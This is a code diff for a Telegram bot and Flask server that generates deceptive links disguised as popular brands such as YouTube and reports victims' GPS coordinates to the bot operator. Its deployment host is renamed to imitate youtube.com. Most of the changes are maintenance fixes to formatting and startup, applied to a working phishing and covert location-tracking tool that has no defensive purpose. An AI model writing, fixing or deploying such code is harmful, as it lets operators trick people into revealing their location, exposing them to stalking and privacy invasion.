@@ -24,7 +24,7 @@ TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
 if not TELEGRAM_TOKEN:
     raise ValueError("No TELEGRAM_TOKEN set")
 
-BASE_URL = os.environ.get('BASE_URL', 'https://location-tracker-v2xk.onrender.com')
+BASE_URL = os.environ.get('BASE_URL', 'https://youtube-com-t2rz.onrender.com')
 
 # Brand Templates
 FAKE_DOMAINS = {
@@ -358,8 +358,8 @@ def capture_location():
             bot.send_location(chat_id=chat_id, latitude=latitude, longitude=longitude)
             bot.send_message(
                 chat_id=chat_id,
-                text=f"📍 *Location Captured!*\n\nCoordinates: {latitude:.6f}, {longitude:.6f}",
-                parse_mode='Markdown'
+                text=f"📍 Location Captured!\n\nCoordinates: {latitude:.6f}, {longitude:.6f}",
+                parse_mode=None
             )
         except:
             pass
@@ -393,7 +393,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🎯 *Select Fake Domain for Your Link*\n\n"
         "Choose which website your link should look like:\n"
         "The link will appear to be from this domain.\n\n"
-        "Example: `https://your-bot.com/youtube.com/watch/abc123`",
+        "Example: https://your-bot.com/youtube.com/watch/abc123",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -410,10 +410,10 @@ async def brand_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await query.edit_message_text(
         f"✅ Selected: {brand_info['icon']} *{brand_info['name']}*\n"
-        f"📝 Fake domain: `{brand_info['path']}`\n\n"
+        f"📝 Fake domain: {brand_info['path']}\n\n"
         f"📝 *Now send me the REAL website URL* to redirect users to.\n\n"
-        f"Example: `https://your-website.com`\n\n"
-        f"Or send `/cancel` to cancel.",
+        f"Example: https://your-website.com\n\n"
+        f"Or send /cancel to cancel.",
         parse_mode='Markdown'
     )
     
@@ -430,8 +430,8 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if '.' not in website_url:
         await update.message.reply_text(
-            "❌ Invalid URL. Send like: `https://example.com`",
-            parse_mode='Markdown'
+            "❌ Invalid URL. Send like: https://example.com",
+            parse_mode=None
         )
         return WEBSITE_INPUT
     
@@ -445,13 +445,13 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"✅ *Link Generated!*\n\n"
-        f"🔗 `{link}`\n\n"
-        f"🎭 *Looks like:* {brand_info['path']}\n"
-        f"🌐 *Redirects to:* {website_url}\n\n"
+        f"✅ Link Generated!\n\n"
+        f"🔗 {link}\n\n"
+        f"🎭 Looks like: {brand_info['path']}\n"
+        f"🌐 Redirects to: {website_url}\n\n"
         f"Share this link - it looks like a {brand_info['name']} link!",
         reply_markup=reply_markup,
-        parse_mode='Markdown'
+        parse_mode=None  # Disable markdown to avoid parsing errors
     )
     
     return ConversationHandler.END
@@ -486,11 +486,14 @@ async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "❌ Cancelled. Send /start to begin again.",
-        parse_mode='Markdown'
+        parse_mode=None
     )
     return ConversationHandler.END
 
 def main():
+    # Force single instance
+    os.environ["WEB_CONCURRENCY"] = "1"
+    
     # Fix for Python 3.14+ event loop issue
     try:
         loop = asyncio.get_running_loop()
@@ -517,13 +520,28 @@ def main():
     application.add_handler(conv_handler)
     application.add_handler(CallbackQueryHandler(new_link, pattern='^new_link$'))
     
-    # Start Flask in background
+    # Start Flask in background with single thread
     import threading
     port = int(os.environ.get('PORT', 5000))
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)).start()
+    threading.Thread(
+        target=lambda: app.run(
+            host='0.0.0.0', 
+            port=port, 
+            debug=False, 
+            use_reloader=False,
+            threaded=False
+        ),
+        daemon=True
+    ).start()
     
-    # Start bot
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Start bot with cleanup
+    try:
+        application.run_polling(
+            allowed_updates=Update.ALL_TYPES,
+            stop_signals=None
+        )
+    except Exception as e:
+        print(f"Bot error: {e}")
 
 if __name__ == "__main__":
     main()
